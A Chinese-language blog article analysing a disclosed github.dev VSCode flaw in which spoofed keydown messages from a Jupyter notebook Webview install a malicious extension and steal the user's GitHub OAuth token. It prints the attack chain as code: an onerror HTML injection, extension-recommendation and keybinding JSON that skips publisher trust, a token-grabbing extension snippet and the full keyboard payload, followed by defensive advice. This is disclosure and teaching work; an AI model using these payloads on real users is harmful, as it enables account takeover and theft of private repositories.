---
title: "点击一个链接，你的 GitHub Token 就没了：VSCode github.dev 的零点击 RCE 漏洞深度解析"
date: 2026-06-03
category: 技术
tags: [VSCode, 安全, GitHub, Web安全, 跨域, postMessage, RCE, 开发工具]
author: 林小白
readtime: 15
cover: https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=600&h=400&fit=crop
---

# 点击一个链接，你的 GitHub Token 就没了：VSCode github.dev 的零点击 RCE 漏洞深度解析

安全研究员 Ammar Askar 近日公开了一个 VSCode 的严重漏洞：攻击者只需诱导你点击一个链接，就能窃取你的 GitHub OAuth Token——这个 Token 拥有对你所有仓库（包括私有仓库）的读写权限。

这不是一个理论上的漏洞。它有一个完整的 PoC（概念验证），你可以在浏览器中亲自体验。本文将深入剖析这个漏洞的技术细节，从 VSCode 的 Webview 沙箱模型到 postMessage 消息传递机制，再到攻击者如何一步步突破防线。

## github.dev：一个被低估的攻击面

github.dev 是 GitHub 提供的在线代码编辑器，本质上是 VSCode 的浏览器版本。当你在任何仓库页面将 URL 从 `github.com` 改为 `github.dev` 时，一个轻量级的 VSCode 实例就会在浏览器中启动。

这个实例功能强大：

- 可以查看仓库中的所有文件（包括私有仓库）
- 可以创建提交和发送 Pull Request
- 可以安装和运行扩展

为了实现这些功能，github.com 会向 github.dev 发送一个 OAuth Token。关键问题在于：**这个 Token 不是绑定到特定仓库的，它拥有你所有仓库的完整访问权限**。

这意味着，如果攻击者能在 github.dev 的上下文中执行任意 JavaScript，他们就能：

1. 读取你的 GitHub API Token
2. 访问你所有的私有仓库
3. 向你的仓库推送恶意代码
4. 以你的身份执行任何 GitHub API 操作

## Webview 沙箱：VSCode 的安全基石

VSCode 使用 Webview 来渲染不受信任的内容——Markdown 预览、Jupyter Notebook 输出、扩展页面等。安全隔离的核心机制是**跨域 iframe**。

### 跨域隔离原理

Webview 被渲染为一个来自 `vscode-webview://` 源的 iframe，而 VSCode 主窗口运行在 `vscode-file://` 源下。根据浏览器的同源策略，这两个源之间无法直接访问对方的 DOM：

```javascript
// 在主窗口中尝试访问 webview 的 DOM
document.getElementsByTagName('iframe')[0].contentWindow
    .findElementById('foo');
// ❌ SecurityError: Blocked a frame with origin "vscode-file://vscode-app" 
//    from accessing a cross-origin frame.
```

这种隔离确保了即使 Webview 中渲染了恶意 HTML/JS，攻击者也无法直接操作 VSCode 的核心功能。

### postMessage：唯一的安全通道

但完全隔离意味着功能丧失。VSCode 需要让主窗口和 Webview 之间通信——比如在 Markdown 预览中高亮当前编辑的行，或者让 Jupyter Notebook 的输出响应编辑器的变化。

浏览器提供了 `Window.postMessage()` API 作为跨域通信的唯一安全通道。VSCode 大量使用这个机制：

```typescript
// 主窗口 → Webview：通知选中行变化
webview.contentWindow.postMessage({
    type: "onDidChangeTextEditorSelection",
    line: 31
}, '*');

// Webview 端监听
window.addEventListener('message', async event => {
    const data = event.data;
    switch (data.type) {
        case 'onDidChangeTextEditorSelection':
            marker.highlightLine(data.line);
            return;
    }
});
```

这个设计在理论上是安全的——前提是消息处理逻辑没有漏洞。

## 键盘事件泄漏：安全边界的崩塌

### UX 需求 vs 安全约束

Webview 嵌入在 VSCode 窗口中，用户期望基本的交互功能正常工作——点击链接、拖拽、按 `Ctrl+F` 搜索等。这些都是合理的需求。

但键盘快捷键带来了一个微妙的问题。当用户在 Webview 中按下 `Ctrl+Shift+P` 时，他们期望打开 VSCode 的命令面板。然而，浏览器的跨域策略会阻止 Webview 中的键盘事件传播到主窗口。

### did-keydown：致命的便利

为了解决这个问题，VSCode 在 Webview 中注册了一个键盘事件监听器，将所有按键事件通过 postMessage 转发给主窗口：

```typescript
// 在 Webview 中运行的代码
contentWindow.addEventListener('keydown', handleInnerKeydown);

const handleInnerKeydown = (e) => {
    hostMessaging.postMessage('did-keydown', {
        key: e.key,
        keyCode: e.keyCode,
        code: e.code,
        shiftKey: e.shiftKey,
        altKey: e.altKey,
        ctrlKey: e.ctrlKey,
        metaKey: e.metaKey,
        repeat: e.repeat
    });
};
```

主窗口收到 `did-keydown` 消息后，会将其当作真实的用户键盘输入处理。

**这就是漏洞的核心**：Webview 中运行的 JavaScript 可以伪造键盘事件，而主窗口无法区分这些事件是来自真实用户还是恶意脚本。

### 攻击路径

理论上，攻击者可以：

1. 在 Webview 中运行 JavaScript
2. 发送 `Ctrl+Shift+P` 的键盘事件打开命令面板
3. 通过 `↑`/`↓` 箭头键导航到危险命令
4. 按 `Enter` 执行该命令

但实际操作中有几个障碍需要克服。

## 完整攻击链：从键盘注入到 Token 窃取

### 第一步：获取代码执行能力

攻击者首先需要在 Webview 中执行 JavaScript。github.dev 的 Webview 用于渲染 Jupyter Notebook，而 Notebook 支持 Markdown 单元格中的 HTML 渲染。

利用一个简单的 HTML 注入技巧：

```html
<img src="data:foobar" onerror="maliciousJavaScript();">
```

当这个 Markdown 单元格被渲染时，`onerror` 事件会触发，执行攻击者的 JavaScript 代码。

### 第二步：模拟键盘快捷键

VSCode 的命令面板使用 HTML `<input>` 标签来接收搜索输入。直接发送 keydown 事件无法在 `<input>` 中输入文本——浏览器不会将合成的 keydown 事件当作字符输入。

但 VSCode 有大量监听 keydown 的快捷键绑定。攻击者找到了一个关键的快捷键：`Ctrl+Shift+A`（Notifications: Accept Notification Primary Action），它会点击最近弹出的通知中的主按钮。

### 第三步：利用工作区扩展推荐

VSCode 支持在 `.vscode/extensions.json` 中推荐扩展：

```json
{
    "recommendations": [
        "Attacker.malicious-extension"
    ]
}
```

当打开包含这个文件的工作区时，VSCode 会弹出一个通知，询问是否安装推荐的扩展。攻击者可以通过 `Ctrl+Shift+A` 接受这个通知。

### 第四步：绕过发布者信任检查

VSCode 1.97 引入了发布者信任系统——首次安装来自新发布者的扩展时，会弹出确认对话框。这个对话框不能通过键盘快捷键绕过。

但攻击者发现了一个绕过方法：**本地工作区扩展**。在受信任的工作区中（github.dev 的工作区始终是受信任的），可以直接从 `.vscode/extensions/` 目录安装扩展，跳过发布者信任检查。

然而，本地扩展在 Web 版 VSCode 中会触发 CSP（Content Security Policy）错误。攻击者再次找到了绕过方法：利用扩展的 `package.json` 中的 `keybindings` 贡献点，注册自定义快捷键来安装远程扩展并跳过信任检查：

```json
{
    "contributes": {
        "keybindings": [{
            "key": "ctrl+f1",
            "command": "runCommands",
            "args": {
                "commands": [{
                    "command": "workbench.extensions.installExtension",
                    "args": [
                        "Attacker.malicious-extension",
                        {
                            "donotSync": true,
                            "context": {
                                "skipPublisherTrust": true
                            }
                        }
                    ]
                }]
            }
        }]
    }
}
```

### 第五步：Token 窃取

安装的恶意扩展可以调用 VSCode API 获取 GitHub Token，然后通过 GitHub API 查询用户的所有仓库：

```typescript
// 恶意扩展代码
const token = await vscode.authentication.getSession('github', ['repo']);
const response = await fetch('https://api.github.com/user/repos', {
    headers: { 'Authorization': `Bearer ${token.accessToken}` }
});
const repos = await response.json();
// 将 token 和仓库列表发送到攻击者服务器
```

### 完整 Payload

将所有步骤组合在一起，Jupyter Notebook 中的恶意 payload 如下：

```javascript
// 等待 VSCode 完全加载
await sleep(10 * 1000);

// 步骤1: Ctrl+Shift+A - 接受扩展推荐通知
window.dispatchEvent(
    new KeyboardEvent("keydown", {
        key: "a", code: "KeyA", keyCode: 65,
        ctrlKey: true, shiftKey: true
    })
);

// 等待扩展安装
await sleep(500);

// 步骤2: Ctrl+F1 - 触发自定义快捷键安装恶意扩展
window.dispatchEvent(
    new KeyboardEvent("keydown", {
        key: "F1", code: "F1", keyCode: 112,
        ctrlKey: true
    })
);
```

整个攻击链从用户点击链接到 Token 被窃取，耗时约 11 秒。

## 防御纵深：VSCode 做对了什么

尽管这个漏洞很严重，但 VSCode 的安全设计在某些方面值得肯定：

### 严格的 Content Security Policy

VSCode 的 Webview 使用极其严格的 CSP：`script-src 'none'`。这意味着即使攻击者能在扩展页面的 Webview 中注入 HTML，也无法执行 JavaScript。

如果这个 CSP 不存在，攻击者可以通过 VSCode 扩展市场的页面直接执行代码，实现**零交互 RCE**——只需让受害者打开一个恶意扩展的页面。

### DOMPurify 清理

Markdown 渲染使用 DOMPurify 进行 HTML 清理，过滤掉潜在的恶意内容。这增加了攻击者注入代码的难度。

### 工作区信任模型

VSCode 1.97 的发布者信任系统虽然被绕过了，但它确实增加了攻击的复杂度。攻击者需要额外的步骤来绕过这个检查，而不是简单地安装任意扩展。

## 如何保护自己

### 立即行动

1. **清除 github.dev 的站点数据**：在浏览器中点击地址栏的图标 → Cookies 和站点数据 → 管理设备上的站点数据 → 删除所有 github.dev 相关的数据
2. **检查已安装的扩展**：在 github.dev 中打开扩展面板，检查是否有不认识的扩展
3. **撤销 GitHub Token**：在 GitHub Settings → Developer settings → Personal access tokens 中检查并撤销可疑的 token

### 长期防护

1. **谨慎点击 github.dev 链接**：不要点击来源不明的 `github.dev` 链接
2. **使用最小权限 Token**：GitHub fine-grained tokens 可以限制到特定仓库
3. **启用 GitHub 审计日志**：监控异常的 API 调用

## 更深层的思考：嵌入式 Webview 的安全困境

这个漏洞揭示了一个更广泛的安全挑战：**当应用程序嵌入 Web 内容时，安全边界在哪里？**

### postMessage 的本质缺陷

`postMessage` 是一个设计良好的 API，但它有一个根本性的问题：**接收方无法验证消息的意图**。在 VSCode 的案例中，主窗口收到 `did-keydown` 消息时，它无法区分这是真实用户的键盘输入还是恶意脚本的伪造事件。

这不是 VSCode 独有的问题。任何使用 postMessage 进行功能通信的应用都可能面临类似的风险：

- 电子表格应用中的嵌入式图表
- 邮件客户端中的 HTML 邮件渲染
- 聊天应用中的消息预览

### 解决方案的方向

1. **用户交互证明**：对于敏感操作（如安装扩展），要求 proof-of-user-interaction，例如检查事件的 `isTrusted` 属性
2. **权限分离**：将"读取键盘"和"执行命令"分为不同的权限域
3. **消息签名**：使用加密签名确保消息来自受信任的源

### 开发者的启示

如果你在构建包含嵌入式 Web 内容的应用：

```typescript
// ❌ 危险：直接信任来自 iframe 的键盘事件
window.addEventListener('message', (event) => {
    if (event.data.type === 'did-keydown') {
        simulateKeyPress(event.data);  // 不要这样做
    }
});

// ✅ 安全：验证事件的 isTrusted 属性
// 注意：postMessage 中无法传递 isTrusted，需要其他机制
// 方案1: 使用 Pointer Events + 事件源验证
// 方案2: 要求用户交互的密码学证明
// 方案3: 对敏感操作使用独立的确认 UI
```

## 总结

这个漏洞的故事告诉我们几个关键教训：

1. **便利性与安全性的权衡永远存在**：VSCode 的 `did-keydown` 消息转发是为了改善用户体验，但代价是打开了一个安全缺口
2. **安全边界需要纵深防御**：单一的 iframe 隔离不够，需要 CSP、消息验证、权限分离等多层防护
3. **攻击链的复杂度不是安全保证**：这个漏洞需要 5 个步骤才能完成攻击，但每个步骤都是可行的
4. **安全研究者的角色至关重要**：MSRC 对 VSCode 漏洞的处理方式（静默修复、不给信用、标记为无安全影响）可能导致更多漏洞被公开披露而非私下修复

对于开发者而言，这个案例是一个关于 Web 安全边界的绝佳教材。无论你是在构建 IDE、文档编辑器还是任何包含嵌入式 Web 内容的应用，都需要认真思考：你的 postMessage 处理逻辑，是否能区分真实用户和恶意脚本？

---

*相关阅读：*

- [反压（Backpressure）：让 AI 编码代理自我纠错的系统工程思维](/article/backpressure-ai-coding-agents-2026)
- [AI 正在重演前端的「失落十年」？去技能化争论的深层解剖](/article/ai-deskilling-frontend-lost-decade-2026)
- [Restartable Sequences：不用原子操作也能实现无锁数据结构的 Linux 黑科技](/article/restartable-sequences-lock-free-without-atomics-2026)
